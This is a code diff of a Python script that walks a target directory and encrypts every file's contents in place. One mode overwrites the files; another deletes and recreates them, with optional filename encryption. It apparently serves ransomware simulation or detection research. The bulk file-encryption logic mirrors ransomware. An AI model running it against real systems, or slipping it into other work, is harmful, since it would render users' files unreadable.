@@ -9,8 +9,12 @@ config_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__f
 
 sys.path.append(config_dir)
 
-from crypto_config import ACCESS_TYPE, GEN_CONFIG
-from crypto_config import MODE_OVERWRITE, MODE_DELETECREATE
+from config import PATHS
+
+MODE_OVERWRITE = 0
+MODE_DELETECREATE = 1
+
+mode = MODE_OVERWRITE
 
 
 class Chunk:
@@ -45,15 +49,15 @@ class ChunkSet:
             else:
                 return None
             
-    def pop_all(self, filename):
+    def pop_all(self, filepath):
         """
-        Pop all chunks from the list of chunks for the given filename.
+        Pop all chunks from the list of chunks for the given filepath.
         """
         with self.lock:
-            if filename in self.chunks and len(self.chunks[filename]) > 0:
-                all_chunks = self.chunks[filename]
-                # remove the filename from the chunk_set
-                del self.chunks[filename]
+            if filepath in self.chunks and len(self.chunks[filepath]) > 0:
+                all_chunks = self.chunks[filepath]
+                # remove the filepath from the chunk_set
+                del self.chunks[filepath]
                 return all_chunks
             else:
                 return None
@@ -112,12 +116,11 @@ class ChunkSet:
         """
         return self.chunks.keys()
 
-def read_files(tar_sys_path):
+def read_files(tar_sys_path, chunk_size = 4096):
     """
     Read files from tar_sys_path and insert them into chunk_set which is a class consisting of a dictionary of chunks.
     The ChunkSet is indexed by filename and each filename is mapped to a list of chunks.
     """
-    chunk_size = GEN_CONFIG["chunk_size"]
     chunk_set = ChunkSet()
     
 
@@ -138,14 +141,13 @@ def read_files(tar_sys_path):
 
     return chunk_set
 
-def read_whole_file():
+def read_whole_file(tar_sys_path, chunk_size = 4096):
     """
     Basically the same as read_files() but reads the whole file at once(then divide into chunks in memory) instead of in chunks.
     """
-    chunk_size = GEN_CONFIG["chunk_size"]
     chunk_set = ChunkSet()
 
-    for root, dirs, files in os.walk(GEN_CONFIG["tar_sys_path"]):
+    for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
             with open(filepath, "r+b") as f:
@@ -157,15 +159,14 @@ def read_whole_file():
                     loff += len(chunk)
     return chunk_set
 
-def read_files_threaded():
-    chunk_size = GEN_CONFIG["chunk_size"]
+def read_files_threaded(tar_sys_path, chunk_size = 4096, num_threads = 1):
     chunk_set = ChunkSet()
 
     # Create a queue to hold the filenames
     filename_queue = Queue()
 
     # Add all the filenames to the queue
-    for root, dirs, files in os.walk(GEN_CONFIG["tar_sys_path"]):
+    for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
             filename_queue.put(filepath)
@@ -193,7 +194,6 @@ def read_files_threaded():
             filename_queue.task_done()
 
     # Create a pool of worker threads
-    num_threads = GEN_CONFIG["num_threads"]
     threads = []
     for i in range(num_threads):
         t = threading.Thread(target=worker)
@@ -211,11 +211,11 @@ def read_files_threaded():
 
     return chunk_set
 
-def encrpt_all(chunk_set):
+def encrpt_all(chunk_set, tar_sys_path):
     """
     Encrypt all the files in tar_sys_path by calling encrypt function in ChunkSet class.
     """
-    for root, dirs, files in os.walk(GEN_CONFIG["tar_sys_path"]):
+    for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
             chunk_set.encrpt(filepath)
@@ -230,12 +230,12 @@ def write_files(chunk_set, tar_sys_path):
             with open(filepath, "r+b") as f:
                 while True:
                     chunk = chunk_set.pop(filepath)
-                    if not chunk:
+                    if chunk is None:
                         break
                     f.seek(chunk.loff)
                     f.write(chunk.data)
 
-def write_whole_files(chunk_set, tar_sys_path):
+def write_whole_files(chunk_set, tar_sys_path, sync = False):
     """
     For each file, we first assemble the chunks then write the whole file back to disk.
     """
@@ -244,6 +244,8 @@ def write_whole_files(chunk_set, tar_sys_path):
             filepath = os.path.join(root, filename)
             with open(filepath, "r+b") as f:
                 chunks = chunk_set.pop_all(filepath)
+                if chunks is None:
+                    continue
                 chunks.sort(key=lambda x: x.loff)
                 # assemble data
                 data = []
@@ -252,9 +254,11 @@ def write_whole_files(chunk_set, tar_sys_path):
 
                 data = b"".join(data)
                 f.write(data)
-                f.flush()
+                if sync:
+                    f.flush()
+                    os.fsync(f.fileno())
 
-def write_files_threaded(chunk_set):
+def write_files_threaded(chunk_set, tar_sys_path, num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
     """
@@ -262,7 +266,7 @@ def write_files_threaded(chunk_set):
     filename_queue = Queue()
 
     # Add all the filenames to the queue
-    for root, dirs, files in os.walk(GEN_CONFIG["tar_sys_path"]):
+    for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
             filename_queue.put(filepath)
@@ -279,7 +283,7 @@ def write_files_threaded(chunk_set):
             with open(filepath, "r+b") as f:
                 while True:
                     chunk = chunk_set.pop(filepath)
-                    if not chunk:
+                    if not chunk or chunk is None:
                         break
                     f.seek(chunk.loff)
                     f.write(chunk.data)
@@ -288,7 +292,6 @@ def write_files_threaded(chunk_set):
             filename_queue.task_done()
 
     # Create a pool of worker threads
-    num_threads = GEN_CONFIG["num_threads"]
     threads = []
     for i in range(num_threads):
         t = threading.Thread(target=worker)
@@ -311,13 +314,11 @@ def flush_sync_files(tar_sys_path):
     """
     import time
     flush_start = time.time()
-    # for root, dirs, files in os.walk(tar_sys_path):
-    #     for filename in files:
-    #         filepath = os.path.join(root, filename)
-    #         with open(filepath, "r+b") as f:
-    #             f.flush()
-    os.sync()
-    os.system("echo 3 | sudo tee /proc/sys/vm/drop_caches")
+    for root, dirs, files in os.walk(tar_sys_path):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            with open(filepath, "r+b") as f:
+                f.flush()
     print(f"Flush time: {time.time() - flush_start} seconds")
     print("Flushed all files to disk.")
     
@@ -364,30 +365,38 @@ def create_all(tar_sys_path, chunk_set):
             pass
 
 def main_overwrite():
-    tar_sys_path = GEN_CONFIG["tar_sys_path"]
-    chunk_set = read_files(tar_sys_path)
-    encrpt_all(chunk_set)
+    tar_sys_path = PATHS['injected_path']
+    chunk_set = read_files(tar_sys_path, chunk_size=4096)
+    encrpt_all(chunk_set, tar_sys_path)
     # chunk_set.dump_pick()
-    write_whole_files(chunk_set, tar_sys_path)
+    write_whole_files(chunk_set, tar_sys_path, sync = True)
     # encrypt_filenames(tar_sys_path)
-    flush_sync_files(tar_sys_path)
+    # flush_sync_files(tar_sys_path)
     
 def main_deletecreate():
-    tar_sys_path = GEN_CONFIG["tar_sys_path"]
-    chunk_set = read_files(tar_sys_path)
-    encrpt_all(chunk_set)
+    tar_sys_path = PATHS["injected_path"]
+    chunk_set = read_files(tar_sys_path, chunk_size=4096)
+    encrpt_all(chunk_set, tar_sys_path)
     delete_all(tar_sys_path)
     create_all(tar_sys_path, chunk_set)
-    write_whole_files(chunk_set, tar_sys_path)
-    encrypt_filenames(tar_sys_path)
-    flush_sync_files(tar_sys_path)
+    write_whole_files(chunk_set, tar_sys_path, sync = True)
+    # encrypt_filenames(tar_sys_path)
 
+def handle_flags():
+    global mode
+    for arg in sys.argv[1:]:
+        if arg.startswith('-mode='):
+            mode = int(arg.split('=')[1])
+        else:
+            print('Invalid mode number')
+            exit(1)
 
 if __name__ == '__main__':
-    mode = GEN_CONFIG['mode']
+    handle_flags()
     if mode == MODE_OVERWRITE:
         main_overwrite()
     elif mode == MODE_DELETECREATE:
         main_deletecreate()
     else:
-        print("Invalid mode.")
+        print('Invalid mode number')
+        exit(1)
